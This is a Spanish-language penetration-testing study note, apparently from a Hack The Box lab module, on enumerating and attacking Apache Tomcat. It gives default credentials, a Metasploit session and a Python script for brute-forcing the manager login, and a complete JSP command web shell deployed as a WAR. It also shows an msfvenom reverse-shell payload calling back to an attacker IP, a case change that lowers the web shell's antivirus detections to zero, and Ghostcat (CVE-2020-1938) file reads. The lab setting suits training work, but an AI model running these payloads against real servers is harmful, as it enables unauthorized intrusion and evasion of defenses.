---
tags:
  - Enumeración
  - Web
---
## Enumeración

[Tomcat Apache](https://tomcat.apache.org/) es un servidor web de código abierto que aloja aplicaciones escritas en Java. Tomcat fue diseñado inicialmente para ejecutar Java Servlets y Java Server Pages (JSP) scripts. Sin embargo, su popularidad aumentó en los marcos basados en Java y ahora es ampliamente utilizado por marcos como Spring y herramientas como Gradle. Según los datos recopilados por [ConstruidoCon](https://trends.builtwith.com/Web-Server/Apache-Tomcat-Coyote) hay más de 220,000 sitios web de Tomcat en vivo en este momento.

#### Identificar versión

Ejecutamos EyeWitness y vemos un host listado en "High Value Targets." La herramienta cree que el anfitrión está ejecutando Tomcat, pero debemos confirmar para planificar nuestros ataques. Si estamos tratando con Tomcat en la red externa, esto podría ser un punto de apoyo fácil en el entorno de red interna.

Los servidores Tomcat pueden ser identificados por el encabezado del servidor en la respuesta HTTP. Si el servidor está operando detrás de un proxy inverso, solicitar una página no válida debe revelar el servidor y la versión. Aquí podemos ver esa versión de Tomcat `9.0.30` está en uso.

![Página de error HTTP 404 de Apache Tomcat 9.0.30, que indica 'No encontrado' con el mensaje '/inválido' y descripción sobre el recurso faltante.](https://academy.hackthebox.com/storage/modules/113/tomcat_invalid.png)

Las páginas de error personalizadas pueden estar en uso que no filtran esta información de versión. En este caso, otro método para detectar un servidor y una versión de Tomcat es a través del `/docs` página.

```shell-session
vcrdcr@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```

#### Estructura de Tomcat

```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

El `tomcat-users.xml` el archivo almacena las credenciales de usuario y sus roles asignados.

Cada carpeta dentro `webapps` se espera que tenga la siguiente estructura.

```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```


El archivo más importante entre estos es `WEB-INF/web.xml`, que se conoce como el descriptor de despliegue. Este archivo almacena información sobre las rutas utilizadas por la aplicación y las clases que manejan estas rutas. Todas las clases compiladas utilizadas por la aplicación deben almacenarse en el `WEB-INF/classes` carpeta. Estas clases pueden contener lógica comercial importante, así como información confidencial. Cualquier vulnerabilidad en estos archivos puede llevar a un compromiso total del sitio web. El `lib` la carpeta almacena las bibliotecas necesarias para esa aplicación en particular. El `jsp` almacenes de carpetas [Páginas del Servidor de Yakarta (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), anteriormente conocido como `JavaServer Pages`, que se puede comparar con archivos PHP en un servidor Apache.

Ejemplo de archivo web.xml.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```


El `web.xml` la configuración anterior define un nuevo servlet nombrado `AdminServlet` eso se asigna a la clase `com.inlanefreight.api.AdminServlet`. Java utiliza la notación de puntos para crear nombres de paquetes, lo que significa que la ruta en el disco para la clase definida anteriormente sería:

- `classes/com/inlanefreight/api/AdminServlet.class`

A continuación, se crea un nuevo mapeo de servlets para mapear solicitudes a `/admin` con `AdminServlet`. Esta configuración enviará cualquier solicitud recibida para `/admin` a la `AdminServlet.class` clase para procesamiento. El `web.xml` descriptor contiene mucha información confidencial y es un archivo importante para verificar al aprovechar una vulnerabilidad de Inclusión de Archivos Locales (LFI).

El `tomcat-users.xml` el archivo se utiliza para permitir o no permitir el acceso al `/manager` y `host-manager` páginas de administración.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

El archivo nos muestra cuál es cada uno de los roles `manager-gui`, `manager-script`, `manager-jmx`, y `manager-status` proporcionar acceso a. En este ejemplo, podemos ver que un usuario `tomcat` con la contraseña `tomcat` tiene el `manager-gui` rol y una segunda contraseña débil `admin` está configurado para la cuenta de usuario `admin`


---

#### Enum

Buscamos las siguientes páginas `/manager` y el `/host-manager`.

Podemos intentar localizarlos con una herramienta como `Gobuster` o simplemente navegue directamente hacia ellos.

```shell-session
vcrdcr@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
```

Es posible que podamos iniciar sesión en uno de estos utilizando credenciales débiles como `tomcat:tomcat`, `admin:admin`, etc. Si estos primeros intentos no funcionan, podemos probar un ataque de fuerza bruta de contraseña contra la página de inicio de sesión, cubierta en la siguiente sección. Si tenemos éxito en iniciar sesión, podemos cargar un [Recurso de Aplicación Web o Aplicación Web ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) archivo que contiene un shell web JSP y obtiene ejecución remota de código en el servidor Tomcat.

Ahora que hemos aprendido sobre la estructura y función de Tomcat, vamos a atacarla abusando de la funcionalidad incorporada y explotando una vulnerabilidad conocida que afectó a versiones específicas de Tomcat.


## Ataque

### Tomcat Manager - Iniciar sesión Brute Force

Podemos usar el [auxiliar/escáner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Módulo Metasploit para estos fines, Burp Suite Intruder o cualquier número de scripts para lograr esto. Usaremos Metasploit para nuestros propósitos.

Opciones que ingresar:

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8180                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host
```

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

Digamos que un módulo Metasploit en particular (u otra herramienta) está fallando o no se comporta de la manera que creemos que debería. Siempre podemos usar Burp Suite o ZAP para proxy el tráfico y solucionar problemas. Para hacer esto, primero, encienda Burp Suite y luego configure el `PROXIES` opción como la siguiente:

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080


msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
```

Podemos ver en Burp exactamente cómo funciona el escáner, teniendo en cuenta cada par de credenciales y la codificación base64 para la autenticación básica que usa Tomcat.

![HTTP 401 Solicitudes no autorizadas a /manager/html en Apache Tomcat, que muestran los detalles de solicitud y respuesta con el encabezado de autorización.](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Una rápida comprobación del valor en el `Authorization` el encabezado de una solicitud muestra que el escáner se está ejecutando correctamente, base64 codifica las credenciales `admin:vagrant` la forma en que lo haría la aplicación Tomcat cuando un usuario intenta iniciar sesión directamente desde la aplicación web. Pruebe esto para obtener algunos ejemplos a lo largo de este módulo para comenzar a sentirse cómodo con la depuración a través de un proxy.

```shell-session
vcrdcr@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```

---

#### Con script python

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

```shell-session
vcrdcr@htb[/htb]$ python3 mgr_brute.py  -h
```

```shell-session
vcrdcr@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

### Tomcat Manager - WAR Subida de archivos

Muchas instalaciones de Tomcat proporcionan una interfaz GUI para administrar la aplicación. Esta interfaz está disponible en `/manager/html` de forma predeterminada, que solo los usuarios asignaron el `manager-gui` se permite el acceso a los roles. Las credenciales válidas del administrador se pueden usar para cargar una aplicación Tomcat empaquetada (.Archivo WAR) y comprometer la aplicación. Un WAR, o Web Application Archive, se utiliza para implementar rápidamente aplicaciones web y almacenamiento de respaldo.

Después de realizar un ataque de fuerza bruta y responder a las preguntas 1 y 2 a continuación, navegue hacia `http://web01.inlanefreight.local:8180/manager/html` e ingrese las credenciales.

![Interfaz de Tomcat Web Application Manager que muestra la lista de aplicaciones con rutas, estado y opciones de implementación.](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)

La aplicación web del administrador nos permite implementar instantáneamente nuevas aplicaciones cargando archivos WAR. Se puede crear un archivo WAR utilizando la utilidad zip. Un shell web JSP como [esto](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) se puede descargar y colocar dentro del archivo.

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

```shell-session
vcrdcr@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
vcrdcr@htb[/htb]$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Haga clic en `Browse` para seleccionar el archivo .war y luego haga clic en `Deploy`.

![Tomcat implementa la interfaz con campos para la ruta de contexto, la versión, la configuración XML y la carga de archivos WAR, mostrando 'backup.war' seleccionado.](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Este archivo se carga en la GUI del administrador, después de lo cual el `/backup` la aplicación se agregará a la tabla.

![Tomcat Web Application Manager muestra la lista de aplicaciones con rutas, estado y comandos, incluyendo '/backup' ejecutándose con cero sesiones.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

Si hacemos clic en `backup`, seremos redirigidos a `http://web01.inlanefreight.local:8180/backup/` y conseguir un `404 Not Found` error. Necesitamos especificar el `cmd.jsp` archivo en la URL también. Navegando a `http://web01.inlanefreight.local:8180/backup/cmd.jsp` nos presentará un shell web que podemos usar para ejecutar comandos en el servidor Tomcat. Desde aquí, podríamos actualizar nuestro shell web a un shell inverso interactivo y continuar. Como ejemplos anteriores, podemos interactuar con este shell web a través del navegador o utilizando `cURL` en la línea de comandos. ¡Prueba ambos!

```shell-session
vcrdcr@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

Para limpiar después de nosotros mismos, podemos volver a la página principal de Tomcat Manager y hacer clic en el `Undeploy` botón al lado del `backups` aplicación después, por supuesto, anotando el archivo y la ubicación de carga de nuestro informe, que en nuestro ejemplo es `/opt/tomcat/apache-tomcat-10.0.10/webapps`. Si hacemos un `ls` en ese directorio de nuestro shell web, veremos el subido `backup.war` archivo y el `backup` directorio que contiene el `cmd.jsp` guión y `META-INF` creado después de que la aplicación se implemente. Haciendo clic en `Undeploy` normalmente eliminará el archivo WAR cargado y el directorio asociado con la aplicación.

También podríamos usar `msfvenom` para generar un archivo WAR malicioso. La carga útil [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) ejecutará un shell inverso a través de un archivo JSP. Navegue a la consola Tomcat e implemente este archivo. Tomcat extrae automáticamente el contenido del archivo WAR y lo implementa.

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

Inicie un oyente de Netcat y haga clic en `/backup` para ejecutar el shell.

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

**Con MetaSploit**

El [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) El módulo Metasploit se puede usar para automatizar el proceso que se muestra arriba, pero lo dejaremos como un ejercicio para el lector.

[Esto](https://github.com/SecurityRiskAdvisors/cmd.jsp) El shell web JSP es muy ligero (debajo de 1kb) y utiliza un [Marcador](https://www.freecodecamp.org/news/what-are-bookmarklets/) o marcador del navegador para ejecutar el JavaScript necesario para la funcionalidad del shell web y la interfaz de usuario. Sin ella, navegando a un subido `cmd.jsp` no rendiría nada. Esta es una excelente opción para minimizar nuestra huella y posiblemente evadir detecciones de shells web JSP estándar (aunque el código JSP puede necesitar ser modificado un poco).

El shell web como es solo es detectado por 2/58 proveedores de antivirus.

![Informe VirusTotal que muestra 2 de cada 58 proveedores de seguridad que marcan 'cmd.jsp' como maliciosos con la detección 'Backdoor.ASP.WEBSHELL.UWMANL'.](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un cambio simple como cambiar:

```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```
a:
```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

resultados en 0/58 proveedores de seguridad que marcan el `cmd.jsp` archivo como malicioso en el momento de escribir.


### CVE-2020-1938: Ghostcat

Se descubrió que Tomcat era vulnerable a un LFI no autenticado en un descubrimiento semi-reciente llamado [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). Todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 se encontraron vulnerables. Esta vulnerabilidad fue causada por una configuración incorrecta en el protocolo AJP utilizado por Tomcat. AJP significa Apache Jserv Protocol, que es un protocolo binario utilizado para las solicitudes de proxy. Esto se usa típicamente en solicitudes de proxy a servidores de aplicaciones detrás de los servidores web front-end.

El servicio AJP generalmente se ejecuta en el puerto 8009 en un servidor Tomcat. Esto se puede verificar con un escaneo Nmap específico.

```shell-session
vcrdcr@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

El escaneo anterior confirma que los puertos 8080 y 8009 están abiertos. Se puede encontrar el código PoC para la vulnerabilidad [aquí](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Descargue el script y guárdelo localmente. El exploit solo puede leer archivos y carpetas dentro de la carpeta de aplicaciones web, lo que significa que archivos como `/etc/passwd` se puede acceder a Canalt. Intentemos acceder a la web.xml.

```shell-session
vcrdcr@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

En algunas instalaciones de Tomcat, es posible que podamos acceder a datos confidenciales dentro del archivo WEB-INF.